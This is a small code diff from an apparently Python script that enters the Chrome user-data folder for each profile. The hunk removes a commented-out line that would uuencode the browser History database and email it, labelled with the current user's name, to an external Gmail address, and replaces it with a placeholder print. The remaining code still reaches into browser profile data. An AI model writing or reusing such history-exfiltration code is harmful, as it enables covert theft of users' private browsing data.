@@ -60,7 +60,7 @@ def main(platform):
 
         try:
             os.chdir(f"%APPDATA%\\Local\\Google\\Chrome\\User Data\\Default")
-            #os.system(f"uuencode History Profile{i}History.db | mail -s 'Chrome Mine for Profile {i} from {whoami}' SVBBZGRy@gmail.com")
+            print('e')
         except:
             pass
                
